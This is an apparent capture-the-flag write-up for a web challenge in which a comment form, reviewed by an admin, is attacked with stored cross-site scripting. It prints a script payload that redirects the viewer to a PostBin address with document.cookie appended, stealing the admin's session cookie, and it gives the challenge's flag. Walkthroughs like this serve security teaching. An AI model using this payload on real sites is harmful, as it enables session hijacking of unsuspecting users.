# Government Agriculture Network
## Observing the webpage
```
https://govagriculture.web.ctfcompetition.com/
```
We were given this webpage and by playing around with it, we see some attributes.
* When we press comment, it makes a POST request and sends the raw data we type
* The comment box redirects to a page and prompts us with *our post was submitted for review. Administator will take a look shortly.*  

This is a hint of XSS(Cross Site Scripting), as we were implied that the Admin will take a look(click). In this case, we want to put some code into the text box and somehow record the session when the admin clicked.  
We could setup a simple webserver and put that as an href attribute and gather the data(eg. cokies) on our side.  
## Set up XSS
Although we could setup our server for the Admin to "click" onto, we don't really want to expose our machine and do all that port forwarding stuff. Thankfully, [PostBin](https://postb.in/)could help us do the job.
### PostBin Setup
We could navigate to [PostBin](https://postb.in/) then create a new bin. We will copy donw the adress and preform an XSS attack.
```html
<script>
location.href="https://postb.in/1590382008906-4863273410592?e="+document.cookie;
</script>
```
I didn't get the cookies first try, instead I tried to send over document.html and document.all.  
The data after the question mark would be sent to our bin which we could view a few seconds after we submit the post.
## Get the flag
```
CTF{8aaa2f34b392b415601804c2f5f0f24e}
```
